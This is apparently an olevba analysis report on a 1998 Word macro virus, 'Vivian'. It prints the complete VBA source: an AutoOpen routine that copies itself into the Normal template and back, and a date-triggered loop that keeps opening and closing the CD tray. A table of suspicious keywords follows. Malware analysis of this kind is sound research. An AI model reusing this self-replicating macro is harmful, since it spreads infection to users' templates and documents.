olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Vivian.bas 
in file: Virus.MSWord.Fs.p - OLE stream: 'Macros/VBA/Vivian'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Vivian
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Sub AutoOpen()
On Error Resume Next
With Application
.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Vivian", wdOrganizerObjectProjectItems
.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Vivian", wdOrganizerObjectProjectItems
End With
Do Until Month(Now) <> Day(Now)
DoEvents
mciSendString "set cd door open", 0, 0, 0: mciSendString "set cd door closed", 0, 0, 0: mciSendString "set cd time format tmsf wait", 0, 0, 0: mciSendString "open cdaudio alias cd wait shareable", 0, 0, 0
Loop: End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|Lib                 |May run code from a DLL                      |
|IOC       |winmm.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

